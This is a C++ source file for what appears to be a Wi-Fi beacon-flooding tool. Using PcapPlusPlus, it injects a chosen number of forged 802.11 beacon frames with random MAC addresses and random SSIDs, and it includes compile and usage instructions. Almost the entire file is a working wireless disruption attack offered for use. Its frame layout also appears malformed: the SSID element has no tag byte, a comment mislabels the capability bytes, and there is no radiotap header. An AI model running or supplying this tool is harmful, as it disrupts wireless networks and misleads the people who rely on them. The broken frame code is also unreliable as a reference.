// ============================================================
// beacon_flood.cpp — flood fake SSIDs (beacon frames)
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o beacon_flood beacon_flood.cpp \
//          -I/opt/homebrew/include -L/opt/homebrew/lib \
//          -lPcap++ -lPacket++ -lCommon++ -lpcap
// Usage:   sudo ./beacon_flood <iface> <count>
// ============================================================
#include "PcapLiveDeviceList.h"
#include "Packet.h"
#include "RawPacket.h"
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <random>
#include <unistd.h>

int main(int argc, char** argv) {
    if (argc < 3) return 1;
    auto* dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(argv[1]);
    if (!dev || !dev->open()) return 1;

    std::mt19937 rng{std::random_device{}()};
    int count = std::atoi(argv[2]);

    for (int i = 0; i < count; i++) {
        uint8_t frame[128] = {0x80, 0x00, 0x00, 0x00};
        for (int j = 4; j < 10; j++) frame[j] = rng() & 0xff; // dst
        for (int j = 10; j < 16; j++) frame[j] = rng() & 0xff; // src
        memcpy(frame + 16, frame + 10, 6); // bssid = src

        frame[24] = 0x00; frame[25] = 0x00;
        frame[26] = 0x00; frame[27] = 0x00; frame[28] = 0x00; frame[29] = 0x00;
        frame[30] = 0x00; frame[31] = 0x00;
        frame[32] = 0x64; frame[33] = 0x00;
        frame[34] = 0x01; frame[35] = 0x04; // SSID IE
        frame[36] = 6;
        for (int j = 37; j < 43; j++) frame[j] = 'A' + (rng() % 26);

        pcpp::RawPacket raw(frame, 43 + 4, timeval{0,0}, false);
        dev->sendPacket(&raw);
    }
    std::printf("[+] sent %d fake beacons\n", count);
    return 0;
}
